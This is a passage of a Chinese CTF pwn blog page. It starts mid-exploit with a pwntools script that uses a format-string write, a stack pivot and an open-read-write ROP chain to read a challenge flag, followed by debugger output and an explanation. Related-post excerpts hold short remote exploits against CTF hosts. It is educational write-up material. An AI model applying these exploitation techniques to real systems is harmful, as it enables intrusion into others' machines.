class="string">b&#x27;gift:&#x27;</span>)</span><br><span class="line">f_stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(f_stack))</span><br><span class="line">f_rbp = f_stack+<span class="number">0x810</span></span><br><span class="line">f_ret = f_rbp+<span class="number">8</span></span><br><span class="line">flag = f_stack + <span class="number">0x80</span> + <span class="number">0x98</span></span><br><span class="line">pl3 = fmtstr_payload(<span class="number">6</span>, &#123;f_rbp:f_stack+<span class="number">0x80</span>-<span class="number">8</span>,f_ret:leave &#125;, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">pl3 = pl3.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rop = p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(o)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(r)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">2</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(w)</span><br><span class="line">rop += <span class="string">b&#x27;flag\x00&#x27;</span> </span><br><span class="line">pl3 += rop</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看一下，我们是怎么恢复回显的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x555555558020</span><br><span class="line">00:0000│-03d   0x555555558020 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7bec680 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里的stdout指针成功的被我们改写为指向_IO_2_1_stderr了 ，恢复回显了以后，就可以正常打orw了。</p>
+<p>这里需要注意的是，由于这里没有栈溢出来供我们劫持执行流，所以我们需要用格式化字符串去改ret内存放的地址。</p>
+<p>同时还要注意栈迁移的问题。并不是说把ret处的地址改为我们构造好的rop链的开头地址就好了。如果这样做了，那么指向csu1的地址会被解码识别为指令，自然是执行不通的。每次重新返回main函数后，给出的栈地址都会改变，所以每次都需要重新去接收。</p>
+<p>后面就是正常orw的流程。不过要注意，由于close(1)了，所以read flag的时候，fd会被分配能分配的最小值，自然就是1了。同时write的时候，stdout指向__IO_2_1_stderr，所以 fd要改为2。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/03/16/Magic-gadget/">http://example.com/2026/03/16/Magic-gadget/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/07/Hgame2026/" title="Hgame2026"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-07</div><div class="info-item-2">Hgame2026</div></div><div class="info-2"><div class="info-item-1">Hgame 2026第一周的Hgame pwn的部分题解。花了一周的大部分时间在写。也确实难度很高。万幸的是还好没爆零。还是需要不断学习的。 1.EZheap真的ez吗？😂快被虐哭了😢其实是自己菜。 123456789101112131415161718192021222324252627282930313233343536int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int choice; // [rsp+4h] [rbp-34h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add()...</div></div></div></a><a class="pagination-related" href="/2025/12/11/ISCTF/" title="ISCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-11</div><div class="info-item-2">ISCTF</div></div><div class="info-2"><div class="info-item-1">ISCTF1.Sign 看ida里，可以看出buf是一维数组。类型为dword，4字节。所以索引值为27的 时候，实际上是第28个元素。所以我们只需要控制覆盖buf的第28个元素为-1378178390就可以getshell了。那么padding就是27*4&#x3D;108。由于这里是有符号数转16进制，所以上网站转换一下就行。  目标数的16进制是0xaddaaaaa。同时由于这里是dword，4字节，所以用p32包裹0xaddaaaaa就可以getshell了。 下面给出exp。 12345678from pwn import *io = remote(&#x27;challenge.bluesharkinfo.com&#x27;,25138)pl = b&#x27;a&#x27; * 108 + p32(0xaddaaaaa)io.sendafter(b&#x27;do you like blueshark?&#x27;,pl)io.interactive()  2.Fmt 经典的格式化字符串泄露。但是这里需要换一下附件的依赖。 由于这里给了libc.so.6，所以我们可...</div></div></div></a><a class="pagination-related" href="/2026/02/25/Unictf/" title="Unictf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-25</div><div class="info-item-2">Unictf</div></div><div class="info-2"><div class="info-item-1">Unictf1.什么？我不是汇编高手吗？1234567891011121314151617181920212223242526272829303132333435363738394041int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+8h] [rbp-28h]  int n4; // [rsp+Ch] [rbp-24h]  int i; // [rsp+10h] [rbp-20h]  int n10; // [rsp+14h] [rbp-1Ch]  _BYTE *addr_1; // [rsp+18h] [rbp-18h]  _BYTE *addr; // [rsp+20h] [rbp-10h]  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  addr = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);  if ( addr == (_B...</div></div></div></a><a class="pagination-related" href="/2026/01/20/RDCTF/" title="RDCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-20</div><div class="info-item-2">RDCTF</div></div><div class="info-2"><div class="info-item-1">RDCTF1.Ret2text简单的pwn的入门题。 func函数里有read函数的栈溢出，溢出字节大小为0x20。 1234567int func()&#123;  _BYTE buf[48]; // [rsp+0h] [rbp-30h] BYREF  read(0, buf, 0x50uLL);  return puts(&quot;you may be forgot something~&quot;);&#125;  同时观察里面有backdoor函数，那么直接劫持执行流到后门函数就好。 下面给出exp。 1234567891011from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;121.29.138.132&#x27;,30120)#io = process(&#x27;./pwn&#x27;)backdoor = 0x401269io.recvuntil(b&#x27;input:&#x27;)pl = b&#x27;a&#x27;*0x38 + p64(backdoor)io...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/16/Magic-gadget/" title="Magic_gadget">Magic_gadget</a><time datetime="2026-03-16T14:02:29.000Z" title="发表于 2026-03-16 22:02:29">2026-03-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/10/House-of-force/" title="House_of_force">House_of_force</a><time datetime="2026-03-10T09:32:20.000Z" title="发表于 2026-03-10 17:32:20">2026-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/25/Unictf/" title="Unictf">Unictf</a><time datetime="2026-02-25T11:07:36.000Z" title="发表于 2026-02-25 19:07:36">2026-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/24/Gets/" title="Gets">Gets</a><time datetime="2026-02-24T07:40:32.000Z" title="发表于 2026-02-24 15:40:32">2026-02-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/23/off-by-null/" title="off_by_null">off_by_null</a><time datetime="2026-02-23T15:22:08.000Z" title="发表于 2026-02-23 23:22:08">2026-02-23</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">11</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.23em; color: #999ea6">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">22</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-03-17T12:12:55.151Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
